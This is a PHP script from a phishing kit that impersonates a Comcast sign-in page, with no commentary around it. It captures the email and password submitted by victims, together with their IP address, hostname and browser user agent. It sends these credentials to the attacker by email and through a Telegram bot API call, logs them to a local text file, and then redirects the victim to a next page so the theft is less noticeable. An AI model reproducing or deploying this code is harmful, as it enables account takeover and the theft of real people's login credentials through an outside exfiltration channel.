<?php

session_start();
include ('cid.php');
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$_SESSION['user'] = $_POST['user'];
$_SESSION['passwd'] = $_POST['passwd'];

	$message .= "|------------| @ |--------------|\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|Email           : ".$_POST['user']."\n";
	$message .= "|Password        : ".$_POST['passwd']."\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|--------- I N F O X I P ---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://ip-api.com/json/.$ip ----\n";
	$message .= "User Agent : ".$hostname."\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @2025 --------------|\n";
	$send = $to;
	$subject = "Comcast : $hostname";
    mail($send, $subject, $message);  
$tmz= [
                       'text' => 'Comcast Access :
\/============================\/
   /\/\/\/\@2025/\/\/\/\
[Comcast Log  : ] 
┌[👤 Email: '.$_POST['user'].'
├[🔐 Password:'.$_POST['passwd'].'
├[🌐 IP : '.$ip.'   
└[📡 User-agent : '.$useragent.'
┗━━━━━━━━━━━━━━━━━━
\/============================\/ 


                                       ',
                                       'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$api/sendMessage?".http_build_query($tmz) );	

    $tds = fopen("cum.txt","a");
 fputs($tds,$message);
 fclose($tds);
  header("Location: ./CmaxAuthnAge.php?c_ds_na%2Cc_ds_no%2Cc_ds_ts%2Cclient_id%2Ccontinue%2CmaxAuthnAge%2Cr%2CreqId%2Cs");


?>
